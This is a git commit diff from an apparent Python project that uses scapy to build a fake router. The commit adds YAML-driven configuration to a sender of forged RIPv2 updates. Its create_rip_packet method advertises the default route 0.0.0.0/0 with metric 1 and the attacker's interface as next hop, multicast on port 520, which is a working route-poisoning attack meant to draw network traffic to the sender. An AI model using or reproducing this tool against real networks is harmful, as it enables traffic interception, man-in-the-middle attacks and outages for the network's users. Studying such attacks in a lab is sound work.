196bafb13a5156c345656d8b04c3f5bf2a7adbdc
Wiktor Sędzimir <wiktor.sedzimir@gmail.com>
2026-02-07 15:53:23 +0100

    feat: :sparkles: allow loading fake packets configuration from the file

--- src/fake_router.py
+++ src/fake_router.py
@@ -2,15 +2,17 @@ from scapy.all import *
 from threading import Thread
 from maliciouse_rip.maliciouse_rip_sender import MalliciousRIPSender
 from utils.utils import create_logger
+import os
 
 class FakeRouter:
     def __init__(self):
         super().__init__()
-        self.logger = create_logger(self.__class__.__name__)
+        self.logger = create_logger(self.__class__.__name__, level=logging.DEBUG)
 
     def start(self):
         self.logger.info("Starting fake router...")
-        rip_sender = MalliciousRIPSender(configuration_path="path/to/config")
+        configuration_path = os.path.join(os.path.dirname(__file__), "conf", "rip_update.yaml")
+        rip_sender = MalliciousRIPSender(configuration_path=configuration_path, logger=self.logger)
         rip_sender.start()
         rip_sender.join()
 
--- src/maliciouse_rip/maliciouse_rip_sender.py
+++ src/maliciouse_rip/maliciouse_rip_sender.py
@@ -4,17 +4,57 @@ from scapy.layers.rip import RIP, RIPEntry
 from utils.utils import create_logger
 from threading import Thread
 from typing import override
+from yaml import safe_load
 import logging
 import time
 
 class MalliciousRIPSender(Thread):
     DESTINATION_IP = "224.0.0.9"
     DESTINATION_PORT = 520
+    DEFAULT_ADDRESS = "0.0.0.0"
+    DEFAULT_MASK = "0.0.0.0"
+    DEFAULT_METRIC = 1
 
     def __init__(self, configuration_path: str | None = None, logger: None | logging.Logger = None):
         super().__init__()
-        self.configuration_path = configuration_path
         self.logger = logger if logger else create_logger(self.__class__.__name__)
+        self.config: dict = self.load_configuration(configuration_path)
+
+    def load_configuration(self, configuration_path: str | None):
+        """
+        This method loads the configuration for the malicious RIP sender. The configuration can include the destination IP
+        address, the subnet mask, and the metric for the route. For simplicity, we will use default values for these
+        parameters in this implementation.
+        """
+        self.logger.debug("Loading configuration...")
+        config = {}
+        if configuration_path:
+            with open(configuration_path, "r") as file:
+                config = safe_load(file)
+
+        return config
+
+    def create_rip_packet(self):
+        """
+        This method creates a RIP packet with the malicious route. The route will have a very low metric, making it the
+        preferred route for other routers in the network.
+        """
+        addr = self.config.get("addr", self.DEFAULT_ADDRESS)
+        mask = self.config.get("mask", self.DEFAULT_MASK)
+        metric = self.config.get("metric", self.DEFAULT_METRIC)
+        iface_ip = get_if_addr(conf.iface)
+        next_hop = self.config.get("nextHop", iface_ip)
+
+        rip = RIP(cmd=2, version=2) / RIPEntry(
+            addr=addr,
+            mask=mask,
+            nextHop=next_hop,
+            metric=metric,
+        )
+
+        rip_packet = IP(dst=self.DESTINATION_IP) / UDP(sport=self.DESTINATION_PORT, dport=self.DESTINATION_PORT) / rip
+
+        return rip_packet
 
     def send_malicious_rip_update(self):
         """
@@ -25,17 +65,8 @@ class MalliciousRIPSender(Thread):
         """
         self.logger.debug("Sending fake RIP update...")
 
-        addr = "0.0.0.0"
-        mask = "0.0.0.0"
-        iface_ip = get_if_addr(conf.iface)
+        rip_packet = self.create_rip_packet()
 
-        rip = RIP(cmd=2, version=2) / RIPEntry(
-            addr=addr,
-            mask=mask,
-            nextHop=iface_ip,
-            metric=1,
-        )
-        rip_packet = IP(dst=self.DESTINATION_IP) / UDP(sport=self.DESTINATION_PORT, dport=self.DESTINATION_PORT) / rip
         send(rip_packet)
 
     def send_periodic_updates(self):
